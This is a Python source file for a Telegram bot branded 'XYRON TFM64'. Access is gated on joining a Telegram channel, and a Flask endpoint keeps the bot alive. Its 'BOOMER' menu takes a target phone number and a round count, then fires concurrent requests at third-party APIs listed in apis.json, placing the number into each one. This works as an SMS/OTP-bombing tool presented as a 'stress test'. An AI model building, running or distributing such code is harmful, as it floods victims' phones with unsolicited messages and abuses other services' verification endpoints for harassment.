import os
import json
import time
import threading
import requests
import telebot
from telebot import types
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask

# ─── RENDER PORT CONFIG ──────────────────────────────────────────────────────
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN   = os.environ.get("TOKEN", "")
ADMIN_ID    = 8373846582
CHANNEL     = "@rifatsbotz"
MAX_COUNT   = 11    # max rounds
TIMEOUT_SEC = 10

# ─── STATE ────────────────────────────────────────────────────────────────────
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

global_status   = True
force_join      = True

user_db: dict[int, dict] = {}
user_state: dict[int, dict] = {}

db_lock = threading.Lock()

# ─── LOAD APIs ────────────────────────────────────────────────────────────────
def load_apis() -> list[dict]:
    api_file = os.path.join(os.path.dirname(__file__), "apis.json")
    try:
        with open(api_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data.get("apis", [])
    except Exception:
        return []

APIS = load_apis()

# ─── KEYBOARDS ────────────────────────────────────────────────────────────────
dashboard_config = {
    "text": "👋 *WELCOME TO 『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』*\n\n"
            "SUBSCRIBER ONLY 👊👽🤚\n\n"
            "Powered by 「 Prime Xyron 」👨‍💻\n\n"
            "⚡ Status: *Active*\n"
            "🛡️ System: *Secure & Fast*\n\n"
            "_নিচের বাটন ব্যবহার করে শুরু করুন_ 👇",
    "parse_mode": "Markdown",
    "reply_markup": {
        "keyboard": [
            [{"text": "👤 PROFILE"}, {"text": "💥 BOOMER"}],
            [{"text": "⚙️ SETTINGS"}, {"text": "📢 CHANNEL"}]
        ],
        "resize_keyboard": True
    }
}

def build_dashboard(config: dict) -> types.ReplyKeyboardMarkup:
    rows     = config["reply_markup"]["keyboard"]
    markup   = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    for row in rows:
        buttons = [types.KeyboardButton(btn["text"]) for btn in row]
        markup.row(*buttons)
    return markup

def build_join_inline(user_id: int) -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL.lstrip('@')}"),
        types.InlineKeyboardButton("✅ Verify",        callback_data=f"verify_{user_id}")
    )
    return markup

def build_admin_panel() -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup()
    status_label = "🟢 Global: ON"  if global_status else "🔴 Global: OFF"
    fj_label     = "🔒 ForceJoin: ON" if force_join   else "🔓 ForceJoin: OFF"
    markup.row(
        types.InlineKeyboardButton(status_label, callback_data="admin_toggle_status"),
        types.InlineKeyboardButton(fj_label,     callback_data="admin_toggle_fj")
    )
    markup.row(types.InlineKeyboardButton("📣 Broadcast", callback_data="admin_broadcast"))
    markup.row(types.InlineKeyboardButton("📊 Stats",     callback_data="admin_stats"))
    return markup

# ─── HELPERS ──────────────────────────────────────────────────────────────────
def register_user(user_id: int, username: str = "") -> None:
    with db_lock:
        if user_id not in user_db:
            user_db[user_id] = {
                "username":   username,
                "joined_at":  datetime.utcnow().isoformat(),
                "tests_run":  0
            }

def is_member(user_id: int) -> bool:
    try:
        member = bot.get_chat_member(CHANNEL, user_id)
        return member.status in ("member", "administrator", "creator")
    except Exception:
        return False

def check_access(message: types.Message) -> bool:
    uid = message.from_user.id
    if not global_status and uid != ADMIN_ID:
        bot.send_message(uid, "⚠️ 『 𝑿𝒀𝑹𝑶𝑵 𝑻𝑭𝑴64 』 is offline.")
        return False
    if force_join and uid != ADMIN_ID and not is_member(uid):
        bot.send_message(uid, "🚫 *Access Restricted*", parse_mode="Markdown", reply_markup=build_join_inline(uid))
        return False
    return True

# ─── REQUEST ENGINE ───────────────────────────────────────────────────────────
def _do_request(api: dict, target: str) -> bool:
    url     = api.get("url", "").replace("*****", target)
    method  = api.get("method", "get").upper()
    headers = api.get("headers", {})
    raw_body = api.get("body", "")
    body    = raw_body.replace("*****", target) if raw_body else ""
    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=TIMEOUT_SEC)
        else:
            r = requests.post(url, headers=headers, data=body, timeout=TIMEOUT_SEC)
        return r.status_code < 500
    except Exception:
        return False

def run_stress_test(chat_id: int, target: str, rounds: int) -> None:
    if not APIS:
        bot.send_message(chat_id, "❌ No APIs loaded.")
        return
    total_apis = len(APIS)
    total_tasks = total_apis * rounds
    total_sent, total_ok = 0, 0
    start_time = time.time()
    progress_msg = bot.send_message(chat_id, "⚡ 「 Prime Xyron 」Stream Initiated...", parse_mode="Markdown")
    
    task_list = [api for _ in range(rounds) for api in APIS]
    with ThreadPoolExecutor(max_workers=40) as executor:
        futures = [executor.submit(_do_request, api, target) for api in task_list]
        for future in as_completed(futures):
            total_sent += 1
            if future.result(): total_ok += 1
            if total_sent % 10 == 0 or total_sent == total_tasks:
                try:
                    pct = int((total_sent / total_tasks) * 100)
                    bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                    bot.edit_message_text(f"⚡ Processing: `[{bar}] {pct}%`\n📤 Sent: `{total_sent}`", chat_id, progress_msg.message_id, parse_mode="Markdown")
                except Exception: pass

    elapsed = round(time.time() - start_time, 2)
    bot.send_message(chat_id, f"✅ *Complete!*\nSent: `{total_sent}`\nSuccess: `{total_ok}`\nTime: `{elapsed}s`", parse_mode="Markdown", reply_markup=build_dashboard(dashboard_config))

# ─── HANDLERS ─────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
def cmd_start(message: types.Message):
    uid = message.from_user.id
    register_user(uid, message.from_user.username or "")
    if check_access(message):
        bot.send_message(uid, "🛡️ *XYRON System Active*", parse_mode="Markdown", reply_markup=build_dashboard(dashboard_config))

@bot.message_handler(func=lambda m: m.text == "💥 BOOMER")
def menu_boomer(message: types.Message):
    if not check_access(message): return
    uid = message.from_user.id
    user_state[uid] = {"step": "await_target"}
    bot.send_message(uid, "💥 『 𝑿𝒀𝑹𝑶𝑵 』\n\n📱 Enter target number:", reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add("❌ Cancel"))

@bot.message_handler(func=lambda m: m.text == "👤 PROFILE")
def menu_profile(message: types.Message):
    if not check_access(message): return
    bot.send_message(message.from_user.id, f"👤 Profile: {message.from_user.first_name}")

@bot.message_handler(func=lambda m: m.text == "⚙️ SETTINGS")
def menu_settings(message: types.Message):
    if not check_access(message): return
    bot.send_message(message.from_user.id, "⚙️ Settings managed by admin.")

@bot.message_handler(func=lambda m: m.text == "📢 CHANNEL")
def menu_channel(message: types.Message):
    bot.send_message(message.from_user.id, "📢 Join @rifatsbotz")

@bot.message_handler(func=lambda m: True)
def handle_text(message: types.Message):
    uid = message.from_user.id
    text = message.text
    if text == "❌ Cancel":
        user_state.pop(uid, None)
        bot.send_message(uid, "🔙 Back", reply_markup=build_dashboard(dashboard_config))
        return

    state = user_state.get(uid, {})
    if state.get("step") == "await_target":
        user_state[uid] = {"step": "await_count", "target": text}
        bot.send_message(uid, f"🎯 Target: `{text}`\n🔁 Rounds (1-{MAX_COUNT}):", parse_mode="Markdown")
        return

    if state.get("step") == "await_count":
        try:
            rounds = int(text)
            if 1 <= rounds <= MAX_COUNT:
                target = state.get("target")
                user_state.pop(uid, None)
                threading.Thread(target=run_stress_test, args=(uid, target, rounds), daemon=True).start()
                return
        except: pass
        bot.send_message(uid, f"⚠️ Invalid. Max {MAX_COUNT} rounds.")
        return

    bot.send_message(uid, "🎯 XYRON DASHBOARD", reply_markup=build_dashboard(dashboard_config))

# ─── MAIN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    threading.Thread(target=run_web_server, daemon=True).start()
    bot.infinity_polling()
